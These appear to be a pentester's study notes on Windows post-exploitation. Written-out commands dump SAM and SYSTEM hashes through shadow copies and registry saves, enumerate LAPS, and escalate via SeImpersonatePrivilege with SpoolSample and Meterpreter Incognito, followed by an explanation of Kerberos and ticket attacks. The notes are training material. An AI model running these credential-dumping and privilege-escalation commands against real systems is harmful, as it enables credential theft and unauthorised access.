## Windows Post-exp

Linking Windows LM:
[[Windows LM]]

Meterpreter:
[[General Meterpreter Post-exp]]


### Windows Creds

#### SAM database

SID of the user is the unique user id in the windows system.
#ps1 #creds
```powershell
$env:computername
[wmi] "Win32_userAccount.Domain='corp1',Name='Administrator'"
```
We can resolve it with Powerview. 
#powerview 
[[AD Enum - Powerview & Bloodhound]]

The system has a lock on SAM DB file (**c:\Windows\System32\config\sam**), we can obtain it by making the shadow copy of the disk and copy the SAM DB from the shadow copy.
#cmd
```cmd
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
// Shadow copy volume path
```
Then: 
#cmd #creds-leak 
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam

// and copy the AES encryption key:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system

```

Or we can get the same info from registry:
#cmd #creds-leak 
```cmd
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam

reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

We can either use Creddump7 or Mimikatz to decrypt the NTLM hash:
#creds-leak #mimikatz
```bash
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
cd creddump7/
python pwdump.py /home/kali/system /home/kali/sam
```
For mimikatz:
[[Mimikatz and Rubeus]]

#### LAPS
Enum LAPS:
#ps1 #laps
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
Get-NetGroupMember -GroupName "LAPS Password Readers"


Get-LAPSComputers
```

### Access Tokens

With the **whoami /priv** we can view the user's access token privilages. 

While it is impossible to modify the set of privileges that are associated with an active logon session, it is however possible to add additional privileges that will take effect after the targeted user account logs out and logs back in.
Programmatically this can be done with the **Win32 LsaAddAccountRights** 699 API, but more often it would be performed through a group policy or locally through an application like secpol.msc

There are **two types of access token** - each process has two: one is the orginal one originating from the user and the second one is the impersonation token that can be create which allows a user to act on behalf of another user without that user's credentials. 
Impersonation tokens have four levels: **Anonymous, Identification, Impersonation and Delegation**. Anonymous and Identification only allows the enumeration of info.

Impersonation allows to impersonate the client's identity while Delegation makes it possible to perform the sequential access control checks across multiple machine (distibuted operations). 

#### Elevation with impersonation

There are nine different privileges that may allows for **priv escalation from medium integrity to either high integiry or system integrity** or enable compromised process to run as other user.

**SeImpersonatePrivilege** allows to impersonate any token for which we can get a reference or handle. The privilage is built-in in the LocalService - Network Service account which IIS account is assigned by default. That let us escalate the privilages potentially on any IIS.

If we have the **SeImpersonatePrivilege** we can use the WIN32 API DuplicateTokenEx call to create the primary token from the impersonation token to create the new process in the context of impersonated user. If no token in memory we can likely force the System account to give us its token to impersonate.

We will use **windows pipes** to leverage the **SeImpersonatePrivilege**. Windows Pipes are Interprocess communication like RPC, COM, sockets. A Pipe is a shared memory in kernel that process can use for interprocess comms. It is a client/server, pipe server can create the pipe and pipe clients connect to pipe to interact. Anonymous pipes are used for parent child processes comms, **named pipes** are more broadly used. We will use the named pipe which supports impersonation.

The techinque uses the **print spool service** which runs in the System context. Print Spooler monitor printer object changes and sends change notifications to print clients by connecting to their respective named pipes. To exploit this we need to create the process running with the SeImpersonatePrivialges running as the print client, we would be able to impersonate the System - that can be used both for LPE and Active Directory exploits. 

C# application, creates the pipe, waits for the connection and impersonates the clients that it attempts to connect to. **Refer to the Impersonate VS solution.**

**CreateNamedPipeA** API requires to give the lpName which must follow the standarized format and be unique in the Operating System, like \\.\pipe\spoolss. However, there is a trick with path transformation, so in the SpoolSample we do:
#priv-esc-win
```cmd
SpoolSample.exe appsrv01 appsrv01/pipe/test
```

And in out binary we do:
#priv-esc-win 
```cmd
Impersonate.exe \\.\pipe\test\pipe\spoolss
```


### MSF Incognito

Incognito Meterpreter module can be used to impersonate any logged in users and obtain code execution in their context without password or hashes. This does not rely on Mimikatz.

To use it we must have the System integrity Meterpreter shell.
#msf #priv-esc-win 
``` bash
load incognito
list_tokens -u

e.g.
impersonate_token corp1\\admin
getuid

```


## Kerberos Authentication

Kerberos auth protocol explained: ^6ade8c
1. **User** sends the **AS_REQ** to the **DC**, with the **timestamp encrypted using the user's password hash** (The DC would check if the password is valid by doing the decryption, it checks also the timestamp for dups - replay attacks).
2. The **DC replays** with the AS_REP which has the **session token and TGT** - the **session key is encrypted using the user's password hash** so the client can decrypt and use it. TGT has improtant domain relation info (group membership, IP address of the klient and session key). **To not tamper the TGT is encrypted by the secret known only to DC** (by the **password hash of the krbgt service**). TGT is valid for 10h. 
3. When the user wants to access the **Domain resources** (SMB Share, Exchange - anything which has **SPN in the Domain**) the KDC is contact again with the TGS_REQ. It construct the TGS request with the user and timestamp encrypted using the session key and TGT. The DC uses the krbtgt to decrypt the TGT and then the session key (session key obtained from TGT) to decrypt the username requesting and timestamp.
4. If successful the **TGS_REP** is sent with the - SPN to which access is granted, a new session key to be used with the SPN, **Service Ticket encrypted with the Service NTLM hash** which has the session_key, username, timestamp, AD info etc. The SPN and session key are encrypted using the previous session key (from TGT). Kerberoasting and Silver Ticket: [[Active Directory]]
**Service Authentication:**
5. **Client sends the AP_REQ** with the username and timestamp encrypted with the new session key and the service ticket. The service decrypts the ticket with its own password, then it checks everything and decrypts everything. 
6. Once the service confirms the authentication and authorization (group membership) etc. it responds to the client with the Application specific session (the client is authenticated).

Because of this protocol it mitigates the sniffing and replay attacks and can be done over unencrypted channel.
However, there are issues - when **krbtgt hash** is compromised the user can forge any TGT (**golden ticket**)[[Active Directory]]; - when the **SPN hash** is compromised the user can forge any Service Tickets (**silver ticket**);[[Active Directory]] - the user can crack service ticket for the service passwords offline (weak service password becomes the issue) using obtained TGS; kerberoasting: [[Active Directory]]. 

For Mimikatz and Rubeus guide refer here: [[Mimikatz and Rubeus]]

